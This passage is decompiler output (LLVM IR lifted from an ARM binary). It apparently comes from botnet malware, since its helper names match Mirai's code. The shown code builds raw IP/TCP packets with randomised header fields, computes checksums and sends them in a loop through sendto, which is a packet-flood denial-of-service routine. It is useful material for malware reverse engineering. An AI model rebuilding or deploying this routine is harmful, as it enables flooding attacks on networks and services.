  %v3_a098 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_a044, 256
  %v4_a0a0 = urem i32 %tmp61, 256
  %v5_a0a0 = or i32 %v4_a0a0, %v3_a094
  %tmp62 = udiv i32 %v1_a088, 256
  %v3_a0a4 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v7_9e48, 256
  %v3_a0a8 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_a048, 256
  %v4_a0ac = urem i32 %tmp64, 256
  %v5_a0ac = or i32 %v4_a0ac, %v3_a098
  store i32 %v5_a0ac, i32* @fp, align 4
  %v4_a0bc = udiv i32 %v1_a088, 16777216
  %v5_a0bc = or i32 %v3_a0a4, %v4_a0bc
  store i32 %v5_a0bc, i32* @lr, align 4
  %tmp65 = udiv i32 %v7_9e48, 256
  %v4_a0c0 = urem i32 %tmp65, 256
  %v5_a0c0 = or i32 %v4_a0c0, %v3_a0a8
  store i32 %v5_a0c0, i32* @r5, align 4
  %tmp66 = mul i32 %v6_9edc, 256
  %v3_a0cc = and i32 %tmp66, 65280
  %v1_a0d0 = urem i32 %v6_9f10, 2
  %v1_a0d4 = urem i32 %v6_9f28, 2
  %tmp67 = udiv i32 %v6_9edc, 256
  %v4_a0d8 = urem i32 %tmp67, 256
  %v5_a0d8 = or i32 %v4_a0d8, %v3_a0cc
  %v1_a0e4 = urem i32 %v6_9f40, 2
  store i32 %v1_a0e4, i32* %r2.global-to-local, align 4
  %v1_a0e8 = urem i32 %v6_9f58, 2
  store i32 %v1_a0e8, i32* %r3.global-to-local, align 4
  store i32 %v6_9f70, i32* %ip.global-to-local, align 4
  store i32 %v6_9f88, i32* %r0.global-to-local, align 4
  store i32 %v6_9f40, i32* %r1.global-to-local, align 4
  %v1_a110 = urem i32 %v6_9f70, 2
  store i32 %v1_a110, i32* @sb, align 4
  store i32 %v0_a05c, i32* @r4, align 4
  %v1_a118 = urem i32 %v6_9f40, 256
  store i32 %v1_a118, i32* @r6, align 4
  %v1_a11c = urem i32 %v6_9f88, 2
  store i32 %v1_a11c, i32* @sl, align 4
  %sext = mul nuw i32 %v5_a0bc, 65536
  %v4_a190 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_a0c0, 65536
  %v4_a198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_a0a0, 65536
  %v4_a1b4 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_a0d4
  %v4_a204 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_a0e4
  %v4_a218 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_a0e8
  %v4_a22c = and i32 %tmp71, 4
  %v1_a184 = trunc i32 %v6_9e60 to i8
  br label %dec_label_pc_a120

dec_label_pc_a120:                                ; preds = %.thread9, %dec_label_pc_a070
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a12c = call i32 @calloc(i32 1510, i32 1)
  %v2_a134 = load i32, i32* @r4, align 4
  %v5_a134 = mul i32 %v2_a134, 4
  %v6_a134 = add i32 %v5_a134, %v2_9e0c
  %v7_a134 = inttoptr i32 %v6_a134 to i32*
  store i32 %v2_a12c, i32* %v7_a134, align 4
  %v3_a138 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a138, i32* %r2.global-to-local, align 4
  %v5_a140 = mul i32 %v3_a138, 24
  %v1_a144 = load i32, i32* @r7, align 4
  %v2_a144 = add i32 %v1_a144, %v5_a140
  store i32 %v2_a144, i32* %r0.global-to-local, align 4
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v4_a14c = mul i32 %v3_a138, 4
  %v5_a14c = add i32 %v4_a14c, %v2_9e0c
  %v6_a14c = inttoptr i32 %v5_a14c to i32*
  %v7_a14c = load i32, i32* %v6_a14c, align 4
  store i32 %v7_a14c, i32* %r1.global-to-local, align 4
  %v1_a150 = inttoptr i32 %v7_a14c to i8*
  %v2_a150 = load i8, i8* %v1_a150, align 1
  %tmp72 = urem i8 %v2_a150, 16
  %v1_a154 = zext i8 %tmp72 to i32
  %v1_a158 = or i32 %v1_a154, 64
  store i32 %v1_a158, i32* %r3.global-to-local, align 4
  %v1_a15c = trunc i32 %v1_a158 to i8
  store i8 %v1_a15c, i8* %v1_a150, align 1
  %v0_a160 = load i32, i32* %r1.global-to-local, align 4
  %v1_a160 = inttoptr i32 %v0_a160 to i8*
  %v2_a160 = load i8, i8* %v1_a160, align 1
  %v1_a164 = and i8 %v2_a160, -16
  %v1_a168 = or i8 %v1_a164, 5
  store i32 %v1_9e8c, i32* %ip.global-to-local, align 4
  store i8 %v1_a168, i8* %v1_a160, align 1
  store i32 %v6_9e24, i32* %r2.global-to-local, align 4
  %v2_a178 = load i32, i32* %r1.global-to-local, align 4
  %v3_a178 = add i32 %v2_a178, 1
  %v4_a178 = inttoptr i32 %v3_a178 to i8*
  store i8 %v5_9e44, i8* %v4_a178, align 1
  store i32 %v1_9e68, i32* %r3.global-to-local, align 4
  %v0_a180 = load i32, i32* %ip.global-to-local, align 4
  %v2_a180 = icmp eq i32 %v0_a180, 0
  store i1 %v2_a180, i1* %cpsr_z.global-to-local, align 1
  %v2_a184 = load i32, i32* %r1.global-to-local, align 4
  %v3_a184 = add i32 %v2_a184, 8
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a188, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a120
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a18c = load i32, i32* %r1.global-to-local, align 4
  %v4_a18c = add i32 %v3_a18c, 6
  %v5_a18c = inttoptr i32 %v4_a18c to i16*
  store i16 64, i16* %v5_a18c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a120, %bb
  store i32 %v4_a190, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_a198, i32* %r2.global-to-local, align 4
  %v2_a19c = load i32, i32* %r1.global-to-local, align 4
  %v3_a19c = add i32 %v2_a19c, 9
  %v4_a19c = inttoptr i32 %v3_a19c to i8*
  store i8 6, i8* %v4_a19c, align 1
  %v0_a1a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a1a0 = trunc i32 %v0_a1a0 to i16
  %v2_a1a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a1a0 = add i32 %v2_a1a0, 2
  %v4_a1a0 = inttoptr i32 %v3_a1a0 to i16*
  store i16 %v1_a1a0, i16* %v4_a1a0, align 2
  store i32 %v6_9fdc, i32* %ip.global-to-local, align 4
  %v1_a1a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_a1a8 = add i32 %v1_a1a8, 12
  %v3_a1a8 = inttoptr i32 %v2_a1a8 to i32*
  store i32 %v6_9fdc, i32* %v3_a1a8, align 4
  %v0_a1ac = load i32, i32* %r2.global-to-local, align 4
  %v1_a1ac = trunc i32 %v0_a1ac to i16
  %v2_a1ac = load i32, i32* %r1.global-to-local, align 4
  %v3_a1ac = add i32 %v2_a1ac, 4
  %v4_a1ac = inttoptr i32 %v3_a1ac to i16*
  store i16 %v1_a1ac, i16* %v4_a1ac, align 2
  %v0_a1b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1b0 = add i32 %v0_a1b0, 16
  %v2_a1b0 = inttoptr i32 %v1_a1b0 to i32*
  %v3_a1b0 = load i32, i32* %v2_a1b0, align 4
  store i32 %v3_a1b0, i32* %r2.global-to-local, align 4
  store i32 %v4_a1b4, i32* %r0.global-to-local, align 4
  %v1_a1b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_a1b8 = add i32 %v1_a1b8, 16
  %v3_a1b8 = inttoptr i32 %v2_a1b8 to i32*
  store i32 %v3_a1b0, i32* %v3_a1b8, align 4
  %v0_a1bc = load i32, i32* %r0.global-to-local, align 4
  %v1_a1bc = trunc i32 %v0_a1bc to i16
  %v2_a1bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a1bc = add i32 %v2_a1bc, 20
  %v4_a1bc = inttoptr i32 %v3_a1bc to i16*
  store i16 %v1_a1bc, i16* %v4_a1bc, align 2
  %v0_a1c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c0 = add i32 %v0_a1c0, 20
  store i32 %v1_a1c0, i32* @r4, align 4
  %v1_a1c4 = add i32 %v0_a1c0, 32
  %v2_a1c4 = inttoptr i32 %v1_a1c4 to i8*
  %v3_a1c4 = load i8, i8* %v2_a1c4, align 1
  %v4_a1c4 = zext i8 %v3_a1c4 to i32
  %v1_a1c8 = and i32 %v4_a1c4, 95
  store i32 %v1_a1c8, i32* %r3.global-to-local, align 4
  %v1_a1cc = add i32 %v0_a1c0, 33
  %v2_a1cc = inttoptr i32 %v1_a1cc to i8*
  %v3_a1cc = load i8, i8* %v2_a1cc, align 1
  %v4_a1cc = zext i8 %v3_a1cc to i32
  store i32 %v4_a1cc, i32* %r2.global-to-local, align 4
  %v1_a1d0 = or i32 %v1_a1c8, 80
  %v1_a1d4 = add i32 %v0_a1c0, 40
  store i32 %v1_a1d4, i32* @r5, align 4
  store i32 %v1_a0d0, i32* %r1.global-to-local, align 4
  %v1_a1dc = trunc i32 %v1_a1d0 to i8
  store i8 %v1_a1dc, i8* %v2_a1c4, align 1
  store i32 %v5_a0d8, i32* %r3.global-to-local, align 4
  %v0_a1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1e4 = and i32 %v0_a1e4, -33
  %v1_a1e8 = load i32, i32* %r1.global-to-local, align 4
  %v4_a1e8 = mul i32 %v1_a1e8, 32
  %v5_a1e8 = or i32 %v4_a1e8, %v1_a1e4
  store i32 %v5_a1e8, i32* %r2.global-to-local, align 4
  %v1_a1ec = load i32, i32* @r4, align 4
  %v2_a1ec = add i32 %v1_a1ec, 4
  %v3_a1ec = inttoptr i32 %v2_a1ec to i32*
  store i32 %v5_a0d8, i32* %v3_a1ec, align 4
  %v0_a1f0 = load i32, i32* @fp, align 4
  %v1_a1f0 = trunc i32 %v0_a1f0 to i16
  %v2_a1f0 = load i32, i32* @r4, align 4
  %v3_a1f0 = add i32 %v2_a1f0, 2
  %v4_a1f0 = inttoptr i32 %v3_a1f0 to i16*
  store i16 %v1_a1f0, i16* %v4_a1f0, align 2
  %v0_a1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1f4 = trunc i32 %v0_a1f4 to i8
  %v2_a1f4 = load i32, i32* @r4, align 4
  %v3_a1f4 = add i32 %v2_a1f4, 13
  %v4_a1f4 = inttoptr i32 %v3_a1f4 to i8*
  store i8 %v1_a1f4, i8* %v4_a1f4, align 1
  %v0_a1f8 = load i32, i32* @r4, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 13
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i8*
  %v3_a1f8 = load i8, i8* %v2_a1f8, align 1
  %v4_a1f8 = zext i8 %v3_a1f8 to i32
  store i32 %v1_a0d4, i32* %ip.global-to-local, align 4
  %v1_a200 = and i32 %v4_a1f8, 239
  %v5_a204 = or i32 %v1_a200, %v4_a204
  store i32 %v5_a204, i32* %r3.global-to-local, align 4
  %v1_a208 = trunc i32 %v5_a204 to i8
  store i8 %v1_a208, i8* %v2_a1f8, align 1
  %v0_a20c = load i32, i32* @r4, align 4
  %v1_a20c = add i32 %v0_a20c, 13
  %v2_a20c = inttoptr i32 %v1_a20c to i8*
  %v3_a20c = load i8, i8* %v2_a20c, align 1
  %v4_a20c = zext i8 %v3_a20c to i32
  store i32 %v1_a0e4, i32* %r0.global-to-local, align 4
  %v1_a214 = and i32 %v4_a20c, 247
  %v5_a218 = or i32 %v1_a214, %v4_a218
  store i32 %v5_a218, i32* %r2.global-to-local, align 4
  %v1_a21c = trunc i32 %v5_a218 to i8
  store i8 %v1_a21c, i8* %v2_a20c, align 1
  %v0_a220 = load i32, i32* @r4, align 4
  %v1_a220 = add i32 %v0_a220, 13
  %v2_a220 = inttoptr i32 %v1_a220 to i8*
  %v3_a220 = load i8, i8* %v2_a220, align 1
  %v4_a220 = zext i8 %v3_a220 to i32
  store i32 %v1_a0e8, i32* %r1.global-to-local, align 4
  %v1_a228 = and i32 %v4_a220, 251
  %v5_a22c = or i32 %v1_a228, %v4_a22c
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = trunc i32 %v5_a22c to i8
  store i8 %v1_a230, i8* %v2_a220, align 1
  %v0_a234 = load i32, i32* @r4, align 4
  %v1_a234 = add i32 %v0_a234, 13
  %v2_a234 = inttoptr i32 %v1_a234 to i8*
  %v3_a234 = load i8, i8* %v2_a234, align 1
  %v4_a234 = zext i8 %v3_a234 to i32
  %v1_a238 = and i32 %v4_a234, 253
  %v1_a23c = load i32, i32* @sb, align 4
  %v3_a23c = mul i32 %v1_a23c, 2
  %v4_a23c = or i32 %v3_a23c, %v1_a238
  store i32 %v4_a23c, i32* %r2.global-to-local, align 4
  %v1_a240 = trunc i32 %v4_a23c to i8
  store i8 %v1_a240, i8* %v2_a234, align 1
  %v0_a244 = load i32, i32* @r4, align 4
  %v1_a244 = add i32 %v0_a244, 13
  %v2_a244 = inttoptr i32 %v1_a244 to i8*
  %v3_a244 = load i8, i8* %v2_a244, align 1
  %v4_a244 = zext i8 %v3_a244 to i32
  %v1_a248 = and i32 %v4_a244, 254
  %v0_a24c = load i32, i32* @sl, align 4
  %v2_a24c = or i32 %v1_a248, %v0_a24c
  store i32 %v2_a24c, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v2_a24c to i8
  store i8 %v1_a250, i8* %v2_a244, align 1
  %v0_a254 = call i32 @rand_next()
  %v1_a254 = trunc i32 %v0_a254 to i16
  store i32 %v0_a254, i32* %r0.global-to-local, align 4
  %v0_a258 = load i32, i32* @r6, align 4
  %v2_a258 = icmp eq i32 %v0_a258, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a258, label %.thread9, label %bb68

bb68:                                             ; preds = %.thread
  %v1_a25c = load i32, i32* @r4, align 4
  %v2_a25c = add i32 %v1_a25c, 13
  %v3_a25c = inttoptr i32 %v2_a25c to i8*
  %v4_a25c = load i8, i8* %v3_a25c, align 1
  %v5_a25c = zext i8 %v4_a25c to i32
  %v2_a260 = or i32 %v5_a25c, 8
  store i32 %v2_a260, i32* %r3.global-to-local, align 4
  %v2_a264 = trunc i32 %v2_a260 to i8
  store i8 %v2_a264, i8* %v3_a25c, align 1
  br label %.thread9

.thread9:                                         ; preds = %.thread, %bb68
  %v3_a268 = load i32, i32* @r4, align 4
  %v4_a268 = add i32 %v3_a268, 14
  %v5_a268 = inttoptr i32 %v4_a268 to i16*
  store i16 %v1_a254, i16* %v5_a268, align 2
  %v0_a26c = load i32, i32* @r8, align 4
  store i32 %v0_a26c, i32* %r1.global-to-local, align 4
  %v0_a270 = load i32, i32* @r5, align 4
  store i32 %v0_a270, i32* %r0.global-to-local, align 4
  %v2_a274 = call i32 @rand_alphastr(i32 %v0_a270, i32 %v0_a26c)
  store i32 %v2_a274, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a27c = load i32, i32* @r5, align 4
  %v3_a27c = load i32, i32* @r8, align 4
  %v4_a27c = add i32 %v3_a27c, %v2_a27c
  %v5_a27c = inttoptr i32 %v4_a27c to i8*
  store i8 0, i8* %v5_a27c, align 1
  %v3_a280 = load i32, i32* %stack_var_-44, align 4
  %v1_a284 = add i32 %v3_a280, 1
  store i32 %v1_a284, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_a28c = icmp eq i32 %v1_a284, %arg2
  store i1 %v9_a28c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a284, i32* %stack_var_-44, align 4
  %v5_a294 = icmp slt i32 %v1_a284, %arg2
  br i1 %v5_a294, label %dec_label_pc_a120, label %dec_label_pc_a298.preheader

dec_label_pc_a298.preheader:                      ; preds = %.thread9, %dec_label_pc_a038
  %v2_a2d4 = icmp eq i32 %v6_9fdc, -1
  %v7_a2d4 = icmp eq i32 %v6_9fdc, -1
  %v3_a448 = icmp eq i32 %v3_a04c, 65535
  %v2_a4ac = icmp eq i32 %v1_9fc8, 0
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a298.preheader, %dec_label_pc_a4d4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_a058, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a058, label %dec_label_pc_a4d4, label %dec_label_pc_a2ac

dec_label_pc_a2ac:                                ; preds = %dec_label_pc_a298
  %v0_a2ac = load i32, i32* @r8, align 4
  %v3_a2ac = mul i32 %v0_a2ac, 65536
  %v1_a2b0 = add i32 %v3_a2ac, 1310720
  store i32 %v1_a2b0, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_a2b0, 256
  %v3_a2b8 = and i32 %tmp69, 65280
  store i32 %v3_a2b8, i32* %r3.global-to-local, align 4
  %v4_a2bc = udiv i32 %v1_a2b0, 16777216
  %v5_a2bc = or i32 %v3_a2b8, %v4_a2bc
  store i32 %v5_a2bc, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a2c4 = add i32 %v0_a2ac, 20
  store i32 %v1_a2c4, i32* @sb, align 4
  %v1_a2c8 = add i32 %v0_a2ac, 40
  store i32 %v1_a2c8, i32* @sl, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a3b4
  store i32 %v6_9fdc, i32* %r0.global-to-local, align 4
  store i1 %v7_a2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2d4, label %dec_label_pc_a438, label %dec_label_pc_a2dc

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a3d8, %dec_label_pc_a2d0
  store i32 %v3_a04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a448, label %dec_label_pc_a454, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge, %dec_label_pc_a2dc
  %v1_a2f4 = phi i32 [ %v1_a2f4.pre, %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge ], [ 65535, %dec_label_pc_a2dc ]
  store i32 %v3_a050, i32* %r2.global-to-local, align 4
  %v9_a2f4 = icmp eq i32 %v3_a050, %v1_a2f4
  store i1 %v9_a2f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2f4, label %dec_label_pc_a468, label %dec_label_pc_a2fc

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge, %dec_label_pc_a2f0
  %v1_a300 = phi i32 [ %v1_a300.pre, %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge ], [ %v1_a2f4, %dec_label_pc_a2f0 ]
  store i32 %v3_a054, i32* %r3.global-to-local, align 4
  %v9_a300 = icmp eq i32 %v3_a054, %v1_a300
  store i1 %v9_a300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a300, label %dec_label_pc_a47c, label %dec_label_pc_a308

dec_label_pc_a308:                                ; preds = %dec_label_pc_a468.dec_label_pc_a308_crit_edge, %dec_label_pc_a2fc
  %v1_a30c = phi i32 [ %v1_a30c.pre, %dec_label_pc_a468.dec_label_pc_a308_crit_edge ], [ %v1_a300, %dec_label_pc_a2fc ]
  store i32 %v6_9edc, i32* %ip.global-to-local, align 4
  %v9_a30c = icmp eq i32 %v6_9edc, %v1_a30c
  store i1 %v9_a30c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a30c, label %dec_label_pc_a490, label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a47c.dec_label_pc_a314_crit_edge, %dec_label_pc_a308
  %v1_a318 = phi i32 [ %v1_a318.pre, %dec_label_pc_a47c.dec_label_pc_a314_crit_edge ], [ %v1_a30c, %dec_label_pc_a308 ]
  store i32 %v6_9ef8, i32* %r0.global-to-local, align 4
  %v9_a318 = icmp eq i32 %v6_9ef8, %v1_a318
  store i1 %v9_a318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a318, label %dec_label_pc_a4a4, label %dec_label_pc_a320

dec_label_pc_a320:                                ; preds = %dec_label_pc_a490, %dec_label_pc_a314
  store i32 %v1_9fc8, i32* %r1.global-to-local, align 4
  store i1 %v2_a4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4ac, label %dec_label_pc_a32c, label %dec_label_pc_a4b8

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a4a4, %dec_label_pc_a4b8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a330 = load i32, i32* @r5, align 4
  %v3_a330 = add i32 %v2_a330, 10
  %v4_a330 = inttoptr i32 %v3_a330 to i16*
  store i16 0, i16* %v4_a330, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a338 = load i32, i32* @r5, align 4
  store i32 %v0_a338, i32* @r0, align 4
  %v2_a33c = call i32 @checksum_generic(i32 %v0_a338, i32 20)
  %v3_a33c = trunc i32 %v2_a33c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a344 = load i32, i32* @r5, align 4
  %v4_a344 = add i32 %v3_a344, 10
  %v5_a344 = inttoptr i32 %v4_a344 to i16*
  store i16 %v3_a33c, i16* %v5_a344, align 2
  %v0_a348 = load i32, i32* @r6, align 4
  store i32 %v0_a348, i32* @r1, align 4
  %v0_a34c = load i32, i32* %r3.global-to-local, align 4
  %v1_a34c = trunc i32 %v0_a34c to i16
  %v3_a34c = add i32 %v0_a348, 16
  %v4_a34c = inttoptr i32 %v3_a34c to i16*
  store i16 %v1_a34c, i16* %v4_a34c, align 2
  %v0_a350 = load i32, i32* @fp, align 4
  store i32 %v0_a350, i32* %r2.global-to-local, align 4
  %v0_a354 = load i32, i32* @sb, align 4
  store i32 %v0_a354, i32* %r3.global-to-local, align 4
  %v0_a358 = load i32, i32* @r5, align 4
  store i32 %v0_a358, i32* %r0.global-to-local, align 4
  %v4_a35c = call i32 @checksum_tcpudp(i32 %v0_a358, i32 %v0_a348, i32 %v0_a350, i32 %v0_a354)
  %v5_a35c = trunc i32 %v4_a35c to i16
  store i32 %v4_a35c, i32* %r0.global-to-local, align 4
  %v3_a360 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a360, i32* %r3.global-to-local, align 4
  %v3_a364 = mul i32 %v3_a360, 32
  store i32 %v3_a364, i32* %lr.global-to-local, align 4
  %v3_a368 = load i32, i32* @r6, align 4
  %v4_a368 = add i32 %v3_a368, 16
  %v5_a368 = inttoptr i32 %v4_a368 to i16*
  store i16 %v5_a35c, i16* %v5_a368, align 2
  %v0_a36c = load i32, i32* %lr.global-to-local, align 4
  %v1_a36c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_a36c, -8
  %v5_a36c = add i32 %v0_a36c, %tmp73
  store i32 %v5_a36c, i32* %lr.global-to-local, align 4
  %v0_a370 = load i32, i32* @r6, align 4
  %v1_a370 = add i32 %v0_a370, 2
  %v2_a370 = inttoptr i32 %v1_a370 to i16*
  %v3_a370 = load i16, i16* %v2_a370, align 2
  %v4_a370 = zext i16 %v3_a370 to i32
  store i32 %v4_a370, i32* @r6, align 4
  %v1_a374 = load i32, i32* @r7, align 4
  %v2_a374 = add i32 %v1_a374, %v5_a36c
  store i32 %v2_a374, i32* @lr, align 4
  %v3_a378 = add i32 %v2_a374, 2
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 %v3_a370, i16* %v4_a378, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a384 = load i32, i32* @r5, align 4
  store i32 %v0_a384, i32* %r1.global-to-local, align 4
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v0_a38c = load i32, i32* @sl, align 4
  store i32 %v0_a38c, i32* %r2.global-to-local, align 4
  %v0_a394 = load i32, i32* @lr, align 4
  %v6_a398 = call i32 @__libc_sendto(i32 %v3_a000, i32 %v0_a384, i32 %v0_a38c, i32 16384, i32 %v0_a394, i32 16)
  %v3_a39c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a39c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_a3a4 = add i32 %v3_a39c, 1
  store i32 %v1_a3a4, i32* %r0.global-to-local, align 4
  %v9_a3a8 = icmp eq i32 %v1_a3a4, %arg2
  store i1 %v9_a3a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3a4, i32* %stack_var_-44, align 4
  %v6_a3b0 = icmp slt i32 %v1_a3a4, %arg2
  br i1 %v6_a3b0, label %dec_label_pc_a3b4, label %dec_label_pc_a4d4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a2ac
  %v1_a3c8 = phi i32 [ %v1_a3a4, %dec_label_pc_a32c ], [ 0, %dec_label_pc_a2ac ]
  %v5_a3b8 = mul i32 %v1_a3c8, 24
  %v1_a3bc = load i32, i32* @r7, align 4
  %v2_a3bc = add i32 %v1_a3bc, %v5_a3b8
  store i32 %v2_a3bc, i32* %r3.global-to-local, align 4
  store i32 %v2_9e0c, i32* %ip.global-to-local, align 4
  %v1_a3c4 = add i32 %v2_a3bc, 20
  %v2_a3c4 = inttoptr i32 %v1_a3c4 to i8*
  %v3_a3c4 = load i8, i8* %v2_a3c4, align 1
  %v4_a3c4 = zext i8 %v3_a3c4 to i32
  store i32 %v4_a3c4, i32* %r2.global-to-local, align 4
  %v4_a3c8 = mul i32 %v1_a3c8, 4
  %v5_a3c8 = add i32 %v4_a3c8, %v2_9e0c
  %v6_a3c8 = inttoptr i32 %v5_a3c8 to i32*
  %v7_a3c8 = load i32, i32* %v6_a3c8, align 4
  store i32 %v7_a3c8, i32* @r5, align 4
  %v2_a3cc = icmp ugt i8 %v3_a3c4, 30
  %v7_a3cc = icmp eq i8 %v3_a3c4, 31
  store i1 %v7_a3cc, i1* %cpsr_z.global-to-local, align 1
  %v1_a3d0 = add i32 %v7_a3c8, 20
  store i32 %v1_a3d0, i32* @r6, align 4
  %v2_a3d4 = xor i1 %v7_a3cc, true
  %v3_a3d4 = and i1 %v2_a3cc, %v2_a3d4
  br i1 %v3_a3d4, label %dec_label_pc_a2d0, label %dec_label_pc_a3d8

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3b4
  %v1_a3d8 = add i32 %v2_a3bc, 16
  %v2_a3d8 = inttoptr i32 %v1_a3d8 to i32*
  %v3_a3d8 = load i32, i32* %v2_a3d8, align 4
  %v0_a3dc = call i32 @rand_next()
  store i32 %v0_a3dc, i32* %r0.global-to-local, align 4
  %v3_a3e0 = load i32, i32* %stack_var_-44, align 4
  %v5_a3e8 = mul i32 %v3_a3e0, 24
  %v1_a3ec = and i32 %v3_a3d8, 16711680
  store i32 %v1_a3ec, i32* %ip.global-to-local, align 4
  %v3_a3f0 = udiv i32 %v3_a3d8, 16777216
  %v4_a3f4 = udiv i32 %v1_a3ec, 256
  %v5_a3f4 = or i32 %v4_a3f4, %v3_a3f0
  store i32 %v5_a3f4, i32* %r2.global-to-local, align 4
  %v1_a3f8 = load i32, i32* @r7, align 4
  %v2_a3f8 = add i32 %v1_a3f8, %v5_a3e8
  store i32 %v2_a3f8, i32* %r1.global-to-local, align 4
  %v1_a3fc = and i32 %v3_a3d8, 65280
  store i32 %v1_a3fc, i32* %r3.global-to-local, align 4
  %v1_a400 = add i32 %v2_a3f8, 20
  %v2_a400 = inttoptr i32 %v1_a400 to i8*
  %v3_a400 = load i8, i8* %v2_a400, align 1
  %v4_a400 = zext i8 %v3_a400 to i32
  store i32 %v4_a400, i32* %ip.global-to-local, align 4
  %v5_a408 = call i32 @llvm.bswap.i32(i32 %v3_a3d8)
  %v7_a40c = lshr i32 %v0_a3dc, %v4_a400
  %v8_a40c = add i32 %v7_a40c, %v5_a408
  store i32 %v8_a40c, i32* %r2.global-to-local, align 4
  %v1_a41c = and i32 %v8_a40c, 65280
  store i32 %v1_a41c, i32* %r1.global-to-local, align 4
  store i32 %v6_9fdc, i32* %r0.global-to-local, align 4
  %v5_a428 = call i32 @llvm.bswap.i32(i32 %v8_a40c)
  store i32 %v5_a428, i32* %r3.global-to-local, align 4
  store i1 %v7_a2d4, i1* %cpsr_z.global-to-local, align 1
  %v1_a430 = load i32, i32* @r5, align 4
  %v2_a430 = add i32 %v1_a430, 16
  %v3_a430 = inttoptr i32 %v2_a430 to i32*
  store i32 %v5_a428, i32* %v3_a430, align 4
  br i1 %v2_a2d4, label %dec_label_pc_a438, label %dec_label_pc_a2dc

dec_label_pc_a438:                                ; preds = %dec_label_pc_a3d8, %dec_label_pc_a2d0
  %v0_a438 = call i32 @rand_next()
  store i32 %v0_a438, i32* %r0.global-to-local, align 4
  store i32 %v3_a04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a448, i1* %cpsr_z.global-to-local, align 1
  %v1_a44c = load i32, i32* @r5, align 4
  %v2_a44c = add i32 %v1_a44c, 12
  %v3_a44c = inttoptr i32 %v2_a44c to i32*
  store i32 %v0_a438, i32* %v3_a44c, align 4
  br i1 %v3_a448, label %dec_label_pc_a454, label %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge

